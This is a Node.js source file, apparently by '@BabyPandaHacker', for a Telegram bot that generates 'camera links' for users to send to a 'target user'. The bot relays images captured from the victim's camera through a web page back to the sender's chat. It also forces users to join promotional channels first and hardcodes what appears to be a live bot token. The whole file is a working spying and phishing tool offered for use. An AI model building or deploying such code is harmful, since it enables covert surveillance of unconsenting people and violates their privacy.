const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");

// 🔴 APNA BOT TOKEN YAHAN DALO
const TOKEN = "8364224671:AAF2zLHWPixVcUT6m4pwHBRWGCzFueEC0H0";

// 🔴 TUMHARA RENDER LIVE LINK
const DOMAIN = "https://babywebpanda.onrender.com";

// ✅ 4 MUST JOIN CHANNELS
const FORCE_CHANNELS = [
  "@fastmoneyloots",
  "@ArruSmmPenal",
  "@backup278847"
];

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static("public"));

const links = {}; // token → chatId

// ✅ Upload folder
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// ✅ Multer storage
const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (req, file, cb) => {
    cb(null, Date.now() + ".jpg");
  },
});
const upload = multer({ storage });

// ✅ CHECK USER JOINED ALL CHANNELS OR NOT
async function isUserJoinedAllChannels(userId) {
  for (const channel of FORCE_CHANNELS) {
    try {
      const member = await bot.getChatMember(channel, userId);
      if (member.status === "left") return false;
    } catch (e) {
      return false;
    }
  }
  return true;
}

// ✅ /start COMMAND
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const joined = await isUserJoinedAllChannels(userId);

  if (!joined) {
    const buttons = FORCE_CHANNELS.map(ch => ([{
      text: `Join ${ch}`,
      url: `https://t.me/${ch.replace("@", "")}`
    }]));

    buttons.push([{ text: "✅ Done Joined", callback_data: "check_join" }]);

    bot.sendMessage(
      chatId,
      "🚨 All channel join kro warna bot work nhi krega!",
      {
        reply_markup: {
          inline_keyboard: buttons
        }
      }
    );
  } else {
    bot.sendMessage(chatId, "✅ Access granted! Ab koi bhi image bhejo.");
  }
});

// ✅ BUTTON CHECK (DONE JOINED)
bot.on("callback_query", async (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;

  if (query.data === "check_join") {
    const joined = await isUserJoinedAllChannels(userId);

    if (!joined) {
      bot.sendMessage(chatId, "❌ Pehle sabhi channel join karo, tabhi bot work karega!");
    } else {
      bot.sendMessage(chatId, "✅ Sab channel join ho gaye! Ab image bhejo.");
    }
  }
});

// ✅ IMAGE → CAMERA LINK GENERATE
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const joined = await isUserJoinedAllChannels(userId);

  if (!joined) {
    bot.sendMessage(chatId, "❌ All channel join kro warna bot work nhi krega! /start dabao");
    return;
  }

  const token = uuidv4();
  links[token] = chatId;

  const link = `${DOMAIN}/capture/${token}`;

  bot.sendMessage(
    chatId,
    `✅ Aapka camera link ready hai:\n\n${link}\n\nIs link ko target user ko bhejo.`
  );
});

// ✅ CAMERA PAGE
app.get("/capture/:token", (req, res) => {
  if (!links[req.params.token]) return res.send("Invalid link!");
  res.sendFile(path.join(__dirname, "public", "capture.html"));
});

// ✅ IMAGE RECEIVE & SEND TO TELEGRAM
app.post("/api/upload/:token", upload.single("photo"), async (req, res) => {
  const chatId = links[req.params.token];
  if (!chatId) return res.json({ error: "Invalid token" });

  await bot.sendPhoto(chatId, req.file.path, {
    caption: "✅ Camera image mil gaya!\n\n👑 Made by >> @BabyPandaHacker"
  });

  delete links[req.params.token];
  res.json({ success: true });
});

// ✅ SERVER START
app.listen(3000, () => {
  console.log("Server running on port 3000");
});
